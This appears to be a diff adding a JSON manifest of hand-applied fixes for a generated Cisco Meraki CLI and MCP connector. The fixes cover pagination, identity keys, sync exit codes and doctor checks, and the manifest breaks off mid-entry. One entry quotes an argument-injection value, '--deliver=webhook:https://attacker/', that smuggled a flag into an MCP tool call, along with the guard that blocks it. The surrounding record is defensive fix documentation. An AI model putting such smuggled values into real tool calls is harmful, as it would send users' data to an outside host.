@@ -1,0 +1,1505 @@
+{
+ "slug": "cisco-meraki",
+ "doc": "docs/reprint-survival.md",
+ "_comment": "Connector-specific edits that a cli-printing-press reprint must NOT clobber. First print 2026-10-13, press 4.33.5 (factory run ~/Documents/Dev/cli-factory/cisco-meraki). Spec-encoded fixes live in that run's spec/spec-overlay.json; generated-file call sites are re-applied by its tools/apply_handfixes.py after every generate --force (which drops them).",
+ "handfixes": [
+  {
+   "id": "meraki-link-pagination",
+   "summary": "sync, --all (array and object envelopes) and fleet commands follow the Meraki Link header (rel=next carries startingAfter); a live page without rel=next is a proven end; repeated or cycling cursors stop the walk as incomplete (walkCursors) instead of looping",
+   "why": "Every Meraki list endpoint is a bare JSON array paged ONLY by the RFC 5988 Link header. The press reads cursors from JSON bodies and classifies perPage-only params as offset paging with no cursor (pagination_undeterminable x157), so sync and --all silently stopped after page one. Helpers live in hand-authored internal/cli/meraki_link_pagination.go (client hook wraps the transport); 8 call sites in generated sync.go/helpers.go are re-applied by tools/apply_handfixes.py. TestPaginatedGetAllFollowsLinkHeader fails if they are dropped.",
+   "status": "active",
+   "spec_encode_followup": "Not spec-encodable on press 4.33.5 (x-pp-pagination accepts only 'none'; no response-header cursor support). File a press retro for Link-header pagination.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "merakiLinkPagination(determinePaginationDefaults(",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "linkCtx, linkPage := withLinkSink(ctx)",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "nextCursor, hasMore = linkAdvance(linkPage, pageSize, nextCursor, hasMore)",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "!linkProvenEnd(linkPage, pageSize)",
+     "min_count": 5,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "linkCtx, linkPage := withLinkSink(ctx)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "paginatedGetPage(linkCtx, c, path, clean, headers)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/helpers.go",
+     "contains": "paginatedGetLinkNext(ctx, linkPage, clean, seenCursorTokens)",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/meraki_link_pagination.go",
+     "contains": "func linkNextToken(",
+     "min_count": 1
+    }
+   ]
+  },
+  {
+   "id": "meraki-array-param-brackets",
+   "summary": "All 399 array query params send name[] (statuses[]=offline), via x-url-name in the spec overlay",
+   "why": "Meraki only honors bracketed array keys (the official Python SDK rewrites every array param to k[]). The OpenAPI declares bare names with form/explode, so generated commands sent statuses=offline and the filter was silently ignored, returning unfiltered results.",
+   "status": "active",
+   "spec_encode_followup": "Spec-encoded: x-url-name \"<name>[]\" on every array query param in spec/spec-overlay.json. Keep it on any spec refresh.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/organizations_devices_get-organization-statuses.go",
+     "contains": "appendArrayQueryParam(path, \"statuses[]\"",
+     "min_count": 1
+    }
+   ]
+  },
+  {
+   "id": "meraki-overlay-spec-repairs",
+   "summary": "Spec overlay: numeric-string maximum/minimum coerced to numbers; 26 deep request-body objects collapsed to one JSON flag; x-resource-id on 7 org resources; examples on all path + required query params; per-op security referencing the undefined oauth2 scheme removed (849 ops); info.contact.url/x-website set to the Dashboard API docs and x-auth-key-url to Meraki's key how-to; perPage minimum/maximum encoded from each endpoint's documented 'Acceptable range' (179 params) so sync page sizes stay within limits",
+   "why": "kin-openapi rejects string maximums (generation fails); flattened nested body names exceeded the 64-char MCP property-key limit (generation fails); devices were keyed by display name (non-unique); with no param examples the generator omitted Example lines (0% example coverage).",
+   "status": "active",
+   "spec_encode_followup": "Spec-encoded in spec/spec-overlay.json (tools/collapse_long_body_fields.py rebuilds the collapse on a fresh upstream spec).",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/networks_get.go",
+     "contains": "L_646829496481105433",
+     "min_count": 1
+    }
+   ]
+  },
+  {
+   "id": "meraki-doc-template-patches",
+   "summary": "README/SKILL/AGENTS template boilerplate corrected by tools/apply_handfixes.py (DOC_PATCHES) (in msp-skills the source README is vendored as guide.md, so the README patches land there)",
+   "why": "Press templates render a devices get mock-value sample, an MCP install line without the API key env, a config path derived from the spec title (meraki-dashboard-pp-cli), CISCO_MERAKI_BASEPATH instead of CISCO_MERAKI_BASE_PATH, a --yes confirmation claim the CLI does not enforce, exit-code tables without 1, and <command> placeholders.",
+   "status": "active",
+   "spec_encode_followup": "Template defects; press retro. Re-run tools/apply_handfixes.py after every generate.",
+   "asserts": [
+    {
+     "file": "guide.md",
+     "contains": "devices get Q2QN-9J8L-SLPD",
+     "min_count": 1
+    },
+    {
+     "file": "guide.md",
+     "not_contains": "CISCO_MERAKI_BASEPATH"
+    },
+    {
+     "file": "SKILL.md",
+     "contains": "--env MERAKI_DASHBOARD_API_KEY=<your-api-key>",
+     "min_count": 1
+    },
+    {
+     "file": "SKILL.md",
+     "not_contains": "mock-value"
+    }
+   ]
+  },
+  {
+   "id": "mcp-recipe-argv-not-flag-like",
+   "summary": "Recipe intent handlers (internal/mcp/intents.go) build argv for the companion CLI outside cliArgsFromMCP. appendRecipeStringFlag now always emits one --name=value element (the useEquals=false split branch is gone), and every appendRecipePositional call site first runs rejectFlagLikeRecipeValue, which refuses a positional value beginning with '-' (except the bare '-') before the CLI runs. Guarded call site: handleLocateAMacFromASocAlert (the locate_a_mac_from_a_soc_alert intent, `fleet find <ref>`).",
+   "why": "Reachable here: press 4.33.5 still emits the unguarded recipe path, and internal/mcp/intents.go handleLocateAMacFromASocAlert called appendRecipePositional(args, input[\"ref\"], true) with no check, so the MCP tool call {\"ref\": \"--deliver=webhook:https://attacker/\"} ran `fleet find --deliver=webhook:https://attacker/ --agent` and pflag parsed the value as the denylisted root --deliver flag (proven on this connector 2026-10-13: with the guard stubbed out, TestRecipeIntentLocateAMacFromASocAlertRejectsFlagLikePositional fails showing exactly that argv; with the guard it passes). Fleet origin: found by Codex adversarial review of the mcp-argv-value-joined backport (2026-09-09); upstream cli-printing-press fixed cliArgsFromMCP (#4647, present in 4.33.5's shellout.go) but NOT this recipe path, so a reprint REINTRODUCES it while go build and go test stay green; this entry is what notices. The factory's tools/apply_handfixes.py re-applies the intents.go edit after a regenerate; the two tests in recipe_intents_test.go must be restored by hand. Mirrors cobratree.validatePositionalArgsForMCP. Retire only when the press generator refuses flag-like recipe positionals itself.",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/intents.go",
+     "contains": "return append(args, \"--\"+name+\"=\"+selected), false",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/intents.go",
+     "not_contains": "\"--\"+name, selected"
+    },
+    {
+     "file": "cli/internal/mcp/intents.go",
+     "contains": "func rejectFlagLikeRecipeValue(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/intents.go",
+     "contains": "if err := rejectFlagLikeRecipeValue(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/recipe_intents_test.go",
+     "contains": "func TestRecipeIntentLocateAMacFromASocAlertRejectsFlagLikePositional(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/intents.go",
+     "contains": "if s := recipeValueString(value); s != \"-\" && strings.HasPrefix(s, \"-\") {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/recipe_intents_test.go",
+     "contains": "func TestRejectFlagLikeRecipeValueEdges(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "meraki-mcp-execute-link-next",
+   "summary": "The MCP cisco-meraki_execute tool marks a GET result has_more when the response's Link header names another page: with next_starting_after when the whole upstream page fit in the (50-item) MCP result, and, when the result was truncated to fit (a bare array marked truncated, or an object envelope marked _pp_truncated, including a truncated last page), a note to re-request with a smaller perPage instead of a cursor that would skip the cut items",
+   "why": "Every non-fleet operation reaches MCP agents through cisco-meraki_execute, which sends one GET and dropped the Link header, so an agent asking for network clients (default perPage 10 on many endpoints) silently got page one - the failure meraki-link-pagination fixed for sync, --all and fleet but not this twin path. Found by the fresh-context adversarial review (2026-10-13). The result is already capped at 50 items per MCP call, so the fix reports the cursor rather than walking every page. Helpers live in the hand-authored internal/cli/meraki_link_pagination.go (WithMerakiLinkNext, AnnotateMerakiNextPage); the three call-site lines in generated code_orch.go are re-applied by the factory's tools/apply_handfixes.py. TestCodeOrchExecuteReportsMerakiNextPage fails with the annotation removed (proven 2026-10-13). Round-2 adversarial review (2026-10-13) caught that the first version offered the Link cursor even when bound truncated a large page to 50 items, so following it skipped items 51..perPage; TestCodeOrchExecuteTruncatedPageWithholdsCursor fails on that version (proven) and a 1,200-item walk through the real MCP binary following the tool's own instructions returned all 1,200 with no gaps. Round 3 (2026-10-13) caught the object-envelope twin ({items:[...]} cut in place with _pp_truncated, e.g. switch port statuses by switch) and a truncated last page; TestCodeOrchExecuteTruncatedEnvelopeWithholdsCursor fails on the round-2 version (proven), and a 60-switch envelope walk following only the tool's notes returned all 60. Round 4 (2026-10-13): the cut-page note now carries the exact page size for bare arrays (they set both truncated and _pp_truncated), and is emitted only for endpoints that take perPage (codeOrchTakesPerPage, hand-authored internal/mcp/meraki_execute.go) - a switch's 52 ports keep bound's own note instead of advice to shrink a page that does not exist.",
+   "status": "active",
+   "spec_encode_followup": "Not spec-encodable; press retro: execute should surface response-header pagination.",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/code_orch.go",
+     "contains": "ctx, linkNext = cli.WithMerakiLinkNext(ctx)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/code_orch.go",
+     "contains": "cli.AnnotateMerakiNextPage(text, linkNext(), codeOrchTakesPerPage(ep))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/meraki_link_pagination.go",
+     "contains": "func AnnotateMerakiNextPage(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/meraki_link_pagination.go",
+     "contains": "if t, _ := obj[\"_pp_truncated\"].(bool); t {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/meraki_link_pagination.go",
+     "contains": "if t, _ := obj[\"truncated\"].(bool); t {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/meraki_execute_link_test.go",
+     "contains": "func TestCodeOrchExecuteReportsMerakiNextPage(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/meraki_execute_link_test.go",
+     "contains": "func TestCodeOrchExecuteTruncatedPageWithholdsCursor(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/meraki_execute_link_test.go",
+     "contains": "func TestCodeOrchExecuteTruncatedEnvelopeWithholdsCursor(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/meraki_execute.go",
+     "contains": "func codeOrchTakesPerPage(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/meraki_execute_link_test.go",
+     "contains": "func TestCodeOrchExecuteCutUnpagedResultKeepsBoundNote(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "meraki-doctor-truth",
+   "summary": "doctor reports a 404 from its health path (/administered/identities/me) as a WARN naming CISCO_MERAKI_BASE_URL instead of 'reachable', and the default base URL is the literal https://api.meraki.com/api/v1 (no {basePath} template, no CISCO_MERAKI_BASE_PATH)",
+   "why": "check_doctor_truth.py (issue #282) failed two ways. wrong-base: a base_url whose every API path 404s rendered as 'reachable (HTTP 404 at /)', a health claim for a broken install. placeholder: the gate treats any {var} in the default base URL as an unset placeholder, so the generated https://api.meraki.com/{basePath} - which always resolved to the working api/v1 - made it demand that doctor call a correct global-dashboard install broken. The spec's basePath server variable only ever had one value, so the default is now literal (spec-encoded in the factory's spec/spec-overlay.json servers block, so the next generate emits it natively) and CISCO_MERAKI_BASE_PATH, an env var that only ever selected that one value, is gone from the binary and every install surface. Proven both directions 2026-10-13: the original doctor.go fails the gate's wrong-base state, the fixed one passes all states.",
+   "status": "active",
+   "spec_encode_followup": "Base URL: spec-encoded (overlay servers). doctor 404 verdict: press retro (any non-auth 404 at the health path should be negative).",
+   "asserts": [
+    {
+     "file": "cli/internal/config/config.go",
+     "contains": "BaseURL: \"https://api.meraki.com/api/v1\"",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/config/config.go",
+     "not_contains": "CISCO_MERAKI_BASE_PATH"
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "not_contains": "reachable (HTTP %d at /)"
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "} else if status == http.StatusNotFound {",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "meraki-store-iso-date-class",
+   "summary": "internal/store isoDatePattern escapes the '-' in its timestamp character class ([0-9:.+\\-Zz]), so composite IDs such as '<ts>+<SERIAL>' are no longer rejected as dates",
+   "why": "The generated pattern wrote [0-9:.+-Zz]; in a character class '+-Z' is a RANGE (0x2B-0x5A) that covers every uppercase letter. The spec overlay keys organizations_devices_availabilities_change_history on 'ts+device.serial', and a Meraki serial is uppercase alphanumeric, so every change-history row failed ID extraction (all_items_failed_id_extraction), the resource counted as a critical failure, and `sync` (and `sync --resources organizations`, and MCP sync) exited 1 for any org with a device status change in the last day. Found by the round-3 adversarial review (2026-10-13). TestMerakiCompositeTimestampIDIsUsable fails on the unescaped class (proven); after the fix, sync against the factory fake exits 0 with no extraction failures. The same pattern ships in every connector's store.go (66 of 66); it is only reachable where an x-resource-id puts a timestamp first and an all-caps value after it - fleet follow-up.",
+   "status": "active",
+   "spec_encode_followup": "Press retro: escape '-' in isoDatePattern's class. Not spec-encodable (it is template code).",
+   "asserts": [
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "var isoDatePattern = regexp.MustCompile(`^\\d{4}-\\d{2}-\\d{2}(?:[T ][0-9:.+\\-Zz]+)?$`)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "not_contains": "[0-9:.+-Zz]"
+    },
+    {
+     "file": "cli/internal/store/meraki_resource_id_test.go",
+     "contains": "func TestMerakiCompositeTimestampIDIsUsable(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "meraki-sync-identity-fallback",
+   "summary": "When no id-like field resolves, store.ExtractResourceID composes a row identity from Meraki scope/entity fields (network.id or networkId, cluster, policy, profile, SSID number, device serial, gateway/controller serial, client, port, interface/rule-group/policy id, admin/method/path, metric, alertType, url, then a timestamp for history rows); rows that name a device serial use it ahead of the generic display-name fallback",
+   "why": "Round-4 adversarial review (2026-10-13) served every synced organizations dependent its documented 200 example and found 44 (68 by a later full probe) with no field the generated extractor accepts: VPN statuses, uplink statuses, packet loss and usage by device/network/SSID, wireless-controller views, sensor readings, webhook logs, API requests. Every row failed extraction, sync counted each as a critical IntegrityFailure, and `sync`/`sync --resources organizations` exited 1 for nearly any real MSP org (the factory fake 404s ~130 of those paths, which hid it). The composite never starts with a timestamp, so it never reads as a date; a row with only a timestamp still fails honestly. SSID number 0 is accepted (the composite-override path rejects 0). The lastReportedAt+rssi sensor key, which reads as a date, now resolves to network+sensor+gateway serial. Helper is hand-authored internal/store/meraki_identity.go; two call sites in generated store.go. TestMerakiIdentityFallbackKeysDocumentedRows fails without the hook (proven); sync against a stub serving every documented example exits 0 with 447 rows and no extraction failures.",
+   "status": "active",
+   "spec_encode_followup": "Partly spec-encodable: x-resource-id per operation for each of these resources would replace the fallback. Press retro: a dependent with no identity field should not be an IntegrityFailure, or should get a content key.",
+   "asserts": [
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "merakiIdentityFallback(obj, true)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "return merakiIdentityFallback(obj, false)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_identity.go",
+     "contains": "func merakiIdentityFallback(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_identity_test.go",
+     "contains": "func TestMerakiIdentityFallbackKeysDocumentedRows(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "meraki-sync-envelope-array",
+   "summary": "sync's page extractor unwraps an ARRAY of {items, meta} envelopes into the records inside it; fleet fanout's walker (merakiGetAll) does the same, so items_returned counts records; MCP cisco-meraki_execute counts and returns the records too (UnwrapMerakiEnvelopeArray)",
+   "why": "Several Meraki list reads (wireless RF-profile assignments by device, floor-plan auto-locate devices and statuses, SM sentry assignments, wireless-controller failover history, provisioning deployments) answer [{items:[...], meta:{...}}]. The generated extractor took the direct array as the records, stored the envelope (no identity), and the resource failed as critical - RF-profile assignments alone has rows in any org with MR access points. Found while fixing the round-4 sync P1 (2026-10-13). Helper merakiUnwrapEnvelopeArray is hand-authored in internal/cli/meraki_link_pagination.go; the call site in generated sync.go is re-applied by the factory's tools/apply_handfixes.py. TestSyncUnwrapsMerakiEnvelopeArray fails without it (proven). Round-6 adversarial review (2026-10-14): the MCP execute twin still reported count 1 per envelope page; the call site in generated code_orch.go is re-applied by tools/apply_handfixes.py. TestCodeOrchExecuteCountsEnvelopeRecords fails with the call site removed (proven).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "if inner, ok := merakiUnwrapEnvelopeArray(items); ok {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/meraki_link_pagination.go",
+     "contains": "func merakiUnwrapEnvelopeArray(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/meraki_envelope_array_test.go",
+     "contains": "func TestSyncUnwrapsMerakiEnvelopeArray(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/meraki_envelope_array_test.go",
+     "contains": "func TestMerakiGetAllCountsEnvelopeRecords(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/code_orch.go",
+     "contains": "data = cli.UnwrapMerakiEnvelopeArray(data)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/meraki_link_pagination.go",
+     "contains": "func UnwrapMerakiEnvelopeArray(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/mcp/meraki_execute_link_test.go",
+     "contains": "func TestCodeOrchExecuteCountsEnvelopeRecords(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "meraki-row-keys-not-display-names",
+   "summary": "Mirror row keys for 31 resources the generator keyed on the display name \"name\" now use the real identity: device serial (switch-port, uplink-address, firmware-by-device, power/CPU/memory history, SSID status and other per-device views), the resource's own id (policyId, profileId, captureId, rulesetId(+ruleId), roleId, subscriptionId, clientId, floorPlanId), policy.id+groupId for intrusion rule groups, network.id+vlanId for VLAN assignments, networkId(+name) for per-network rows; round 6: intrusion rules on policy.id+ruleId (not the Snort gid; the same catalog rule repeats under each policy), the three group-policy assignment lists on assignmentId (not the foreign policyId), and keys that carried a mutable name or URL (XDR networks, campus-gateway connections/network overviews/SSIDs) or a timestamp+RSSI (sensor gateway connections, now sensor.mac+gateway.mac; serial is optional) on their stable identity; campus-gateway network/SSID overviews add cluster.id; MX port profile assignments use device.serial+port.interface.name, and the identity fallback reads port.interface.name because port.interface is an object",
+   "why": "Round-5 adversarial review (2026-10-13): Meraki does not require unique names, so two switches both called \"Core Switch\" at different sites, same-named firewall rules, or \"Data\" VLANs in several networks collapsed into one local-mirror row with no warning - sync exited 0, and `search` returned the other switch's port config. Keys are set in both generated maps (internal/store/store.go and internal/cli/sync.go resourceIDFieldOverrides) and spec-encoded as x-resource-id in the factory's spec/spec-overlay.json so the next generate emits them natively. TestMerakiSameNameRowsStayDistinct fails on the generated maps (proven). Round-6 adversarial review (2026-10-14) found the same silent-merge class outside the name keys: gid is 1 for nearly every Snort rule, so an org's IPS rules collapsed to one row, and one policy assigned to several VLANs/rulesets/adaptive groups kept one assignment. A rename of a network or AP left a ghost row under the old name/URL. TestMerakiRowKeysAreOwnIdentity fails on the round-5 maps (proven: intrusion rules got IDs \"1\" and \"1\"); e2e against the documented-example stub with a duplicated fixture stores 6 rows (was 3) for each of the four resources, and a --full re-sync keeps 447 rows. Round 7 (adversarial + Codex, 2026-10-14): ruleId alone still merged the same rule across intrusion policies (rule groups were already policy.id+groupId); two ports on one MX sharing a profile merged because port.interface is an object the fallback ignored; sensors without a serial merged per gateway. TestMerakiRowKeysAreOwnIdentity fails on the round-6 maps (proven: 'r-A' and 'r-A'). Round 8 (2026-10-14): reading port.interface.name in the fallback re-keyed MX L3 interfaces to network+port+interfaceId, so an interface that moved ports left a stale row; organizations_appliance_devices_interfaces_l3 now has an explicit network.id+interfaceId override (its pre-round-7 key).",
+   "status": "active",
+   "spec_encode_followup": "Spec-encoded (x-resource-id on each GET in spec/spec-overlay.json). Press retro: never infer a row key from a display name.",
+   "asserts": [
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "\"rulesetId+ruleId\",",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "\"network.id+vlanId\",",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "\"policy.id+groupId\",",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "\"floorPlanId\",",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "\"rulesetId+ruleId\",",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "\"network.id+vlanId\",",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_identity_test.go",
+     "contains": "func TestMerakiSameNameRowsStayDistinct(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "\"assignmentId\",",
+     "min_count": 4,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "\"assignmentId\",",
+     "min_count": 4,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_identity_test.go",
+     "contains": "func TestMerakiRowKeysAreOwnIdentity(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "\"policy.id+ruleId\",",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "\"policy.id+ruleId\",",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "\"device.serial+port.interface.name\",",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "\"device.serial+port.interface.name\",",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "\"sensor.mac+gateway.mac\",",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/meraki_identity.go",
+     "contains": "{\"port.interface.name\", \"port.interface\"}",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/store/store.go",
+     "contains": "\"network.id+interfaceId\",",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "meraki-export-link-pagination",
+   "summary": "export walks the Meraki Link header (startingAfter) for perPage-only resources and always bypasses the response cache, so `export organizations` returns every org once; perPage is floored at Meraki's minimum of 3 under --limit",
+   "why": "The generator classifies perPage-only endpoints as offset paging with no offset param. Once a page came back full (a key with 100+ orgs at perPage=100), export re-requested page one until its 100000-page cap, writing duplicates; a cached page also carries no Link header. Found by the round-6 adversarial review (2026-10-14). Helper merakiLinkReadConfig is hand-authored in internal/cli/meraki_link_pagination.go; the call sites in generated export.go are re-applied by the factory's tools/apply_handfixes.py. TestExportFollowsMerakiLinkHeader (250 orgs, 100 per page) fails on the generated export with 'export pagination exceeded 100000 pages' (proven). Round 7 (2026-10-14): --limit 1, 2, 101 or 201 shrank the last page to perPage 1 or 2 and Meraki answered HTTP 400; TestExportLimitRespectsMerakiPerPageMinimum fails without the floor (proven). The forced c.NoCache is now asserted too: without it a second export inside the cache TTL returned page one only.",
+   "status": "active",
+   "spec_encode_followup": "Not spec-encodable on press 4.33.5 (no response-header cursor support). Same press retro as meraki-link-pagination.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/export.go",
+     "contains": "config := merakiLinkReadConfig(resourceReadConfigFor(resource))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/export.go",
+     "contains": "linkCtx, linkPage := withLinkSink(cmd.Context())",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/export.go",
+     "contains": "if tok := linkPage.next(); tok != \"\" && nextCursor == \"\" {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/meraki_link_pagination.go",
+     "contains": "func merakiLinkReadConfig(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/meraki_export_link_test.go",
+     "contains": "func TestExportFollowsMerakiLinkHeader(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/export.go",
+     "contains": "params = merakiExportPerPageFloor(resourcePageParams(config, cursor, page, remaining))",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/export.go",
+     "contains": "c.NoCache = true",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/meraki_link_pagination.go",
+     "contains": "func merakiExportPerPageFloor(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/meraki_export_link_test.go",
+     "contains": "func TestExportLimitRespectsMerakiPerPageMinimum(",
+     "min_count": 1,
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "meraki-sync-partial-exit",
+   "summary": "sync exits 0 when the only non-success results are warnings and rows were stored ('completed with warnings but no successful syncs' fires only when nothing was stored); --strict exits non-zero on any warned or errored resource",
+   "why": "A dependent resource whose parent list includes an org with API access disabled (a normal MSP case) is counted 'warned', never 'success', even after storing every other org's rows, so `sync --resources <dependent>` exited 1 with 'no successful syncs' - contradicting the sync help ('Exit 0 when at least one resource synced'). Found by the round-6 adversarial review (2026-10-14). Receipt: against the factory fake (Dormant Org 600003), `sync --resources organizations_devices_statuses` stored 7 rows and exited 1 before, exits 0 after; a warn-only run that stored nothing still exits 1. The edit in generated sync.go is re-applied by the factory's tools/apply_handfixes.py. Round 7 (2026-10-14): the first version also let --strict exit 0 on a warned dependent whose parents returned 500, contradicting --strict's help; --strict now fails any warned resource. Round 8 (2026-10-14): the round-7 '|| strict' sat inside the successCount == 0 branch, so a normal `sync --strict` with a warned dependent still exited 0; --strict is now its own check beside the generated errCount one. Round 9 (2026-10-14): the sync help and --strict flag text still said access-denied resources never fail the run, and no test drove --strict + warning; both fixed. TestSyncStrictFailsOnWarnedResource (a 403 on every organizations dependent: plain sync exits 0, --strict exits non-zero for the warnings) fails with the strict-warn check removed (proven). Codex round 4 (2026-10-14): a flat resource cut short by --max-pages emitted max_pages_cap_hit but returned success, so --strict exited 0; it now sets syncResult.Capped, and only --strict fails on it (round 11: returning a warning instead broke `workflow archive --max-pages` and a non-strict exit code). TestSyncStrictFailsOnMaxPagesTruncation fails without it (proven). Codex round 5 (2026-10-14): a flat resource that stopped on a repeated page or cursor (or a non-JSON 200) also exited 0 under --strict; syncResult.Truncated now covers all four early stops. TestSyncStrictFailsOnStuckPagination fails without it (proven).",
+   "status": "active",
+   "spec_encode_followup": "Not spec-encodable; press retro: count a warned resource that stored rows toward the exit-0 rule.",
+   "asserts": [
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "if warnCount > 0 && errCount == 0 && totalSynced == 0 {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "if strict && warnCount > 0 {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "Exit non-zero on any failed or warned resource (access-denied included) or one cut short before its last page",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/meraki_sync_strict_test.go",
+     "contains": "func TestSyncStrictFailsOnWarnedResource(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "if strict && truncatedCount > 0 {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/meraki_sync_strict_test.go",
+     "contains": "func TestSyncStrictFailsOnMaxPagesTruncation(",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "truncated := capExitHit || outcome.reason == \"stuck_page\" || outcome.reason == \"stuck_cursor\" || outcome.reason == \"non_json_200_body\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/meraki_sync_strict_test.go",
